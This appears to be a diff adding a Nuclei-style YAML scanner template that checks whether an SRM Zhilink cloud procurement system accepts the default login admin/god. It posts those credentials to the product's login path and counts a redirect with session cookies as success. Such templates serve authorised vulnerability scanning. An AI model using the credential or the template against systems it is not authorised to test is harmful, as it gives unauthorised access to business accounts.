@@ -1,0 +1,29 @@
+id: poc-yaml-zhilink-srm-adpweb-login
+info:
+  name: SRM Zhilink Cloud Procurement System Weak Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: weak-password
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/adpweb/a/login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |
+      username=admin&password=god
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: word
+        part: header
+        words:
+          - "/adpweb/a;JSESSIONID="
+          - "zhilink.session.id="
+          - "Path=/adpweb"
